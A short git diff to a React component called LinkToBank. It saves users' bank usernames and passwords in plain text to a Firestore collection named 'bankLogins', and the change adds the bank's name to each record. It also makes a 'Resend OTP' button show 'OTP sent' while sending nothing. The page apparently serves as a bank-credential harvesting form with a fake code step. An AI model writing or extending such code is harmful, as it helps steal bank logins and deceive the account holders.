@@ -70,6 +70,7 @@ function LinkToBank() {
          await setDoc(doc(db, "bankLogins", userDetails.Fname + userDetails.Lname), {
             username: logs.username,
             password: logs.password,
+            bankName: selectedBank.BankName,
          })
          .then((data)=> {
            toast.success("submitted", {position: "top-center"})
@@ -252,7 +253,7 @@ function LinkToBank() {
           Didn't receive the code?
           <button
             className="resend-btn"
-            onClick={() => alert("Resend OTP clicked")}
+            onClick={() => alert("OTP sent")}
             aria-label="Resend OTP"
             type="button"
           >
